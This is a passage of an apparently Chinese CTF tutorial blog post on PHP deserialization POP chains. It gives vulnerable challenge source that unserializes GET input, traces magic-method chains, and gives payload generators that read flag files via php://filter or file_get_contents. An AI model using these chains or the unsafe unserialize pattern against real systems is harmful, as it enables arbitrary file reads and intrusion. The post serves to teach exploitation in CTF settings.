+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>       <span class="c1">// 1.头部
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>思路分析：仍然是先找链子的头和尾，头部依然是一个<code>GET</code>传参，而尾部在<code>Modifier</code>类中的<code>append()</code>方法中，因为里面有个<code>include</code>可以完成任意文件包含，那我们很容易就可以想到用伪协议来读文件，找到尾部之后往前倒推，在<code>Modifier</code>类中的<code>__invoke()</code>调用了<code>append()</code>，然后在<code>Test</code>类中的<code>__get()</code>返回的是<code>$function()</code>，可以调用<code>__invoke()</code>，再往前<code>Show</code>类中的<code>__toString()</code>可以调用<code>__get()</code>，然后在<code>Show</code>类中的<code>__wakeup()</code>中有一个正则匹配，可以调用<code>__toString()</code>，然后当我们传入字符串，反序列化之后最先进入的就是<code>__wakeup()</code>，这样子头和尾就连上了</p>
+<p>头 -&gt; Show::__wakeup() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Modifier::__invoke() -&gt; Modifier::append -&gt; 尾</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702868.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>POP链：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">source</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">-&gt;</span> <span class="na">str</span> <span class="o">=</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">-&gt;</span> <span class="na">p</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></div><h3 id="例题42021-强网杯-赌徒" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%9842021-%e5%bc%ba%e7%bd%91%e6%9d%af-%e8%b5%8c%e5%be%92" class="header-mark"></a>例题4——2021 强网杯 赌徒</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//hint is in hint.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Start</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$flag</span><span class="o">=</span><span class="s1">&#39;syst3m(&#34;cat 127.0.0.1/etc/hint&#34;);&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;I think you need /etc/hint . Before this you need to see the source code&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">_sayhello</span><span class="p">(){</span>             <span class="c1">// 3.调用 __toString
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;ok&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>     <span class="c1">// 2.反序列化后马上 __wakeup，调用 __sayhello
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;hi&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sayhello</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$cc</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;give you flag : &#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Info</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$phonenumber</span><span class="o">=</span><span class="mi">123123</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$promise</span><span class="o">=</span><span class="s1">&#39;I do&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">promise</span><span class="o">=</span><span class="s1">&#39;I will not !!!!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">promise</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>                    <span class="c1">// 4. __get 中有不存在的属性，调用 __get
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">ffiillee</span><span class="p">[</span><span class="s1">&#39;ffiilleennaammee&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Room</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/flag&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$sth_to_set</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">){</span>                      <span class="c1">// 5.调用 __invoke
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">Get_hint</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>                    <span class="c1">//7.尾，文件读取
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$hint</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$hint</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>                       <span class="c1">// 6.调用 Get_hint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Get_hint</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">]);</span>    <span class="c1">// 1.头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$hi</span> <span class="o">=</span> <span class="k">new</span>  <span class="nx">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>分析：首先依然是找到头和尾，头部依然是一个GET传参，而尾部可以看到Room类中有个<code>Get_hint()</code>方法，里面有一个<code>file_get_contents</code>，可以实现任意文件读取，我们就可以利用这个读取<code>flag</code>文件了，然后就是往前倒推，Room类中<code>__invoke()</code>方法调用了<code>Get_hint()</code>，然后Room类的<code>__get()</code>里面有个<code>return $function()</code>可以调用<code>__invoke()</code>，再往前看，Info类中的<code>__toString()</code>中有Room类中不存在的属性，所以可以调用<code>__get()</code>，然后Start类中有个<code>_sayhello()</code>可以调用<code>__toString()</code>，然后在Start类中<code>__wakeup()</code>方法中直接调用了<code>_sayhello()</code>，而我们知道的是，输入字符串之后就会先进入<code>__wakeup()</code>，这样头和尾就连上了</p>
+<p>头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint()</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Start</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$flag</span><span class="o">=</span><span class="s1">&#39;syst3m(&#34;cat 127.0.0.1/etc/hint&#34;);&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Info</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">private</span> <span class="nv">$phonenumber</span><span class="o">=</span><span class="mi">123123</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$promise</span><span class="o">=</span><span class="s1">&#39;I do&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">promise</span><span class="o">=</span><span class="s1">&#39;I will not !!!!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">promise</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Room</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/flag&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$sth_to_set</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Info</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Room</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Room</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">name</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">-&gt;</span> <span class="na">a</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-21</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链" data-hashtags="反序列化,PHP"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-hashtag="反序列化"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链" data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer="myspace" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链" data-description=""><span data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></span></button><button title="分享到 Blogger" data-sharer="blogger" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链" data-description=""><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer="evernote" data-url="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/" data-title="[反序列化]POP链"><span class="fab fa-evernote fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>,&nbsp;<a href="/tags/php/">PHP</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
